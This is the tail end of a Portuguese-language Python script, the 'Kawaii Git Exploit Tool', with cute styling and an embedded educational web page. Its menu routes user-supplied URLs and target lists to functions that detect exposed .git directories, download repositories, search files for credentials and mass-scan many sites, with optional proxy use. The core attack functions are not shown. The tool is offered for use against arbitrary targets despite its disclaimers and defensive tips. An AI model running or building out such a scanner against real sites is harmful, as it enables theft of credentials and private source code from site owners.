            <h2>🌸 O que o Kawaii Git Exploit Tool faz?</h2>
            <ul>
                <li><span class="heart">♡</span> Verifica se um site tem o diretório .git exposto</li>
                <li><span class="heart">♡</span> Explora arquivos sensíveis como config, .env, etc.</li>
                <li><span class="heart">♡</span> Busca credenciais em arquivos do Git</li>
                <li><span class="heart">♡</span> Permite baixar o repositório Git inteiro</li>
                <li><span class="heart">♡</span> Faz varredura em massa de vários sites</li>
                <li><span class="heart">♡</span> Escaneia diretórios sensíveis</li>
            </ul>
            
            <h2>🌸 O que o script NÃO faz?</h2>
            <ul>
                <li>✘ Não realiza ataques DDoS ou brute force</li>
                <li>✘ Não explora vulnerabilidades além do Git exposto</li>
                <li>✘ Não modifica ou deleta arquivos no servidor</li>
                <li>✘ Não realiza atividades ilegais</li>
            </ul>
            
            <h2>🌸 Como se proteger?</h2>
            <p>Para proteger seu site:</p>
            <ol>
                <li>Nunca deixe o diretório .git acessível publicamente</li>
                <li>Use arquivos .htaccess para bloquear acesso</li>
                <li>Remova credenciais do código antes de fazer commit</li>
                <li>Use variáveis de ambiente para informações sensíveis</li>
                <li>Revise regularmente as permissões de arquivos</li>
            </ol>
            
            <div style="text-align: center;">
                <a href="https://github.com/" class="btn" target="_blank">Saiba mais sobre segurança Git</a>
                <br>
                <span class="dancing">(っ◔◡◔)っ ♥ Aprenda com responsabilidade! ♥</span>
            </div>
        </section>
        
        <footer>
            <p>Desenvolvido com <span class="heart">♡</span> pela <strong>Rede Valkiria</strong> - Grupo hacker anti CP e fraudes</p>
            <p>✧･ﾟ: *✧･ﾟ:* Nosso objetivo é uma internet mais segura *:･ﾟ✧*:･ﾟ✧</p>
            <p class="kawaii">(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧ Obrigado por usar nossa ferramenta! ✧･ﾟ: *✧･ﾟ:*</p>
        </footer>
    </div>
    
    <script>
        // Animação adicional
        document.querySelectorAll('h2').forEach(h2 => {{
            h2.innerHTML = h2.innerHTML + ' <span class="dancing">✿</span>';
        }});
        
        // Efeito de confete kawaii
        function createConfetti() {{
            const confetti = document.createElement('div');
            const emojis = ['🌸', '🍓', '🍬', '🎀', '💖', '✨', '🎇', '🧁'];
            confetti.innerHTML = emojis[Math.floor(Math.random() * emojis.length)];
            confetti.style.position = 'fixed';
            confetti.style.fontSize = Math.random() * 20 + 15 + 'px';
            confetti.style.top = '-30px';
            confetti.style.left = Math.random() * window.innerWidth + 'px';
            confetti.style.opacity = Math.random();
            confetti.style.animation = 'fall ' + (Math.random() * 5 + 3) + 's linear infinite';
            confetti.style.zIndex = '9999';
            document.body.appendChild(confetti);
            
            setTimeout(() => {{
                confetti.remove();
            }}, 5000);
        }}
        
        // Adiciona estilo para a animação de queda
        const style = document.createElement('style');
        style.innerHTML = `
            @keyframes fall {{
                to {{
                    transform: translateY(100vh) rotate(360deg);
                }}
            }}
        `;
        document.head.appendChild(style);
        
        // Cria confetti periodicamente
        setInterval(createConfetti, 300);
        
        // Efeito ao clicar
        document.addEventListener('click', function(e) {{
            const heart = document.createElement('div');
            heart.innerHTML = '💖';
            heart.style.position = 'fixed';
            heart.style.fontSize = '25px';
            heart.style.left = e.clientX + 'px';
            heart.style.top = e.clientY + 'px';
            heart.style.animation = 'heartClick 1s forwards';
            document.body.appendChild(heart);
            
            setTimeout(() => {{
                heart.remove();
            }}, 1000);
        }});
        
        const heartStyle = document.createElement('style');
        heartStyle.innerHTML = `
            @keyframes heartClick {{
                0% {{ transform: scale(1); opacity: 1; }}
                100% {{ transform: scale(3); opacity: 0; }}
            }}
        `;
        document.head.appendChild(heartStyle);
    </script>
</body>
</html>"""
        
        with open(os.path.join(site_dir, "index.html"), "w", encoding="utf-8") as f:
            f.write(html_content)
        
        # Criar arquivo CSS adicional
        css_content = """
/* Estilos adicionais podem ser colocados aqui */
.rainbow-text {
    background-image: linear-gradient(to left, violet, indigo, blue, green, yellow, orange, red);
    -webkit-background-clip: text;
    background-clip: text;
    color: transparent;
    animation: rainbow 3s linear infinite;
    background-size: 200% 100%;
}

@keyframes rainbow {
    0% { background-position: 0% 50%; }
    100% { background-position: 100% 50%; }
}

.bunny {
    position: fixed;
    bottom: 20px;
    right: 20px;
    font-size: 40px;
    animation: hop 1s infinite alternate;
}

@keyframes hop {
    from { transform: translateY(0) rotate(0deg); }
    to { transform: translateY(-20px) rotate(10deg); }
}
"""
        with open(os.path.join(site_dir, "styles.css"), "w", encoding="utf-8") as f:
            f.write(css_content)
        
        print(c("\n✧･ﾟ: *✧･ﾟ:* Site educativo criado na pasta 'kawaii_site' *:･ﾟ✧*:･ﾟ✧", Colors.GREEN))
        print(c(f"🌸 Você pode visualizá-lo com a opção 8 do menu {get_kawaii_face()}", Colors.CYAN))
    except Exception as e:
        print(c(f"\n(╥﹏╥) Erro ao criar site: {str(e)}", Colors.RED))
        logging.error(f"Error in create_site: {str(e)}")

def start_local_server():
    try:
        site_dir = "kawaii_site"
        if not os.path.exists(site_dir):
            print(c("\n(╥﹏╥) A pasta 'kawaii_site' não existe. Crie o site primeiro com a opção 7.", Colors.RED))
            return
        
        print(c("\n✧･ﾟ: *✧･ﾟ:* Iniciando servidor local *:･ﾟ✧*:･ﾟ✧", Colors.PINK))
        print(c(f"🌸 Abra seu navegador em: {Colors.BOLD}http://localhost:8080", Colors.CYAN))
        print(c("🌸 Pressione Ctrl+C para parar o servidor", Colors.YELLOW))
        
        try:
            os.chdir(site_dir)
            subprocess.run(["python", "-m", "http.server", "8080"])
        except KeyboardInterrupt:
            print(c("\n🌸 Servidor parado {get_kawaii_face()}", Colors.PINK))
        except Exception as e:
            print(c(f"\n🌸 Erro ao iniciar servidor: {str(e)}", Colors.RED))
            logging.error(f"Error in start_local_server: {str(e)}")
        finally:
            os.chdir("..")
    except Exception as e:
        print(c(f"\n(╥﹏╥) Erro ao iniciar servidor: {str(e)}", Colors.RED))
        logging.error(f"Error in start_local_server: {str(e)}")

def settings_menu():
    while True:
        print_settings_menu()
        choice = input(c("\n🌸 Escolha uma opção: ", Colors.PINK))
        
        if choice == "1":
            try:
                new_timeout = int(input(c("🌸 Digite o novo timeout em segundos: ", Colors.CYAN)))
                if 1 <= new_timeout <= 60:
                    config.timeout = new_timeout
                    config.save_config()
                    print(c("🌸 Timeout atualizado com sucesso!", Colors.GREEN))
                else:
                    print(c("🌸 O timeout deve estar entre 1 e 60 segundos", Colors.YELLOW))
            except ValueError:
                print(c("🌸 Por favor, digite um número válido", Colors.RED))
        
        elif choice == "2":
            try:
                new_threads = int(input(c("🌸 Digite o novo número máximo de threads (1-20): ", Colors.CYAN)))
                if 1 <= new_threads <= 20:
                    config.max_threads = new_threads
                    config.save_config()
                    print(c("🌸 Número de threads atualizado com sucesso!", Colors.GREEN))
                else:
                    print(c("🌸 O número de threads deve estar entre 1 e 20", Colors.YELLOW))
            except ValueError:
                print(c("🌸 Por favor, digite um número válido", Colors.RED))
        
        elif choice == "3":
            proxy = input(c("🌸 Digite o proxy (ex: http://user:pass@host:port) ou deixe em branco para remover: ", Colors.CYAN))
            if proxy.strip():
                config.proxies = {
                    'http': proxy,
                    'https': proxy
                }
            else:
                config.proxies = None
            config.save_config()
            print(c("🌸 Configuração de proxy atualizada!", Colors.GREEN))
        
        elif choice == "4":
            config.color_mode = not config.color_mode
            config.save_config()
            status = "ON" if config.color_mode else "OFF"
            print(c(f"🌸 Modo colorido agora está {status}!", Colors.GREEN))
        
        elif choice == "5":
            config.emoji_mode = not config.emoji_mode
            config.save_config()
            status = "ON" if config.emoji_mode else "OFF"
            print(c(f"🌸 Modo emoji agora está {status}!", Colors.GREEN))
        
        elif choice == "6":
            print(c("\n🌸 Formatos de saída disponíveis:", Colors.PINK))
            print(c("1. Texto (padrão)", Colors.CYAN))
            print(c("2. JSON", Colors.CYAN))
            print(c("3. CSV", Colors.CYAN))
            fmt_choice = input(c("🌸 Escolha o formato de saída (1-3): ", Colors.CYAN))
            
            if fmt_choice == "1":
                config.output_format = 'text'
            elif fmt_choice == "2":
                config.output_format = 'json'
            elif fmt_choice == "3":
                config.output_format = 'csv'
            else:
                print(c("🌸 Opção inválida, mantendo formato atual", Colors.YELLOW))
            
            config.save_config()
            print(c(f"🌸 Formato de saída definido como: {config.output_format.upper()}", Colors.GREEN))
        
        elif choice == "0":
            break
        
        else:
            print(c("\n(╥﹏╥) Opção inválida! Por favor, escolha uma opção válida.", Colors.RED))
        
        press_enter_to_continue()

def main():
    try:
        # Verificar dependências
        if not install_dependencies():
            print(c("\n🌸 Algumas funcionalidades podem estar limitadas", Colors.YELLOW))
            press_enter_to_continue()
        
        print_banner()
        
        while True:
            try:
                print_menu()
                choice = input(c("\n🌸 Escolha uma opção: ", Colors.PINK))
                
                if choice == "1":
                    url = input(c("\n🌸 Digite a URL do site (ex: https://exemplo.com): ", Colors.CYAN))
                    if url:
                        is_exposed, found_files = check_git_exposed(url)
                        
                        if is_exposed and input(c("\n🌸 Deseja explorar os arquivos encontrados? (s/n): ", Colors.CYAN)).lower() == 's':
                            explore_git(url.rstrip('/') + '/.git/', found_files)
                
                elif choice == "2":
                    url = input(c("\n🌸 Digite a URL do .git (ex: https://exemplo.com/.git/): ", Colors.CYAN))
                    if url:
                        explore_git(url, [])
                
                elif choice == "3":
                    url = input(c("\n🌸 Digite a URL do .git (ex: https://exemplo.com/.git/): ", Colors.CYAN))
                    if url:
                        download_git_repo(url)
                
                elif choice == "4":
                    url = input(c("\n🌸 Digite a URL do arquivo (ex: https://exemplo.com/.git/config): ", Colors.CYAN))
                    if url:
                        search_credentials_in_file(url)
                
                elif choice == "5":
                    targets_input = input(c("\n🌸 Digite os alvos (um por linha) ou deixe em branco para carregar de arquivo: ", Colors.CYAN))
                    
                    if targets_input.strip():
                        targets = targets_input.split('\n')
                    else:
                        file_path = input(c("🌸 Digite o caminho do arquivo com os alvos: ", Colors.CYAN))
                        try:
                            with open(file_path, 'r') as f:
                                targets = f.read().splitlines()
                            print(c(f"🌸 Alvos carregados: {len(targets)}", Colors.GREEN))
                        except Exception as e:
                            print(c(f"(╥﹏╥) Erro ao carregar arquivo: {str(e)}", Colors.RED))
                            continue
                    
                    if targets:
                        mass_scan(targets)
                
                elif choice == "6":
                    url = input(c("\n🌸 Digite a URL para escanear (ex: https://exemplo.com): ", Colors.CYAN))
                    if url:
                        advanced_directory_scanner(url)
                
                elif choice == "7":
                    create_site()
                
                elif choice == "8":
                    start_local_server()
                
                elif choice == "9":
                    settings_menu()
                
                elif choice == "0":
                    print(c("\n✧･ﾟ: *✧･ﾟ:* Obrigado por usar o Kawaii Git Exploit Tool! *:･ﾟ✧*:･ﾟ✧", Colors.PINK))
                    print(c("🌸 Desenvolvido com ❤️ pela Rede Valkiria - Anti CP & Fraudes", Colors.CYAN))
                    break
                
                else:
                    print(c("\n(╥﹏╥) Opção inválida! Por favor, escolha uma opção válida.", Colors.RED))
                
                press_enter_to_continue()
            
            except KeyboardInterrupt:
                print(c("\n(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧ Operação cancelada pelo usuário ✧･ﾟ: *✧･ﾟ:*", Colors.PINK))
                press_enter_to_continue()
            
            except Exception as e:
                print(c(f"\n(╥﹏╥) Ocorreu um erro: {str(e)}", Colors.RED))
                logging.error(f"Error in main loop: {str(e)}")
                press_enter_to_continue()
    
    except KeyboardInterrupt:
        print(c("\n(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧ Programa encerrado pelo usuário ✧･ﾟ: *✧･ﾟ:*", Colors.PINK))
        sys.exit(0)
    except Exception as e:
        print(c(f"\n(╥﹏╥) Ocorreu um erro inesperado: {str(e)}", Colors.RED))
        logging.error(f"Fatal error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        import concurrent.futures
    except ImportError:
        print("O módulo concurrent.futures não está disponível. Algumas funcionalidades serão limitadas.")
    
    main()
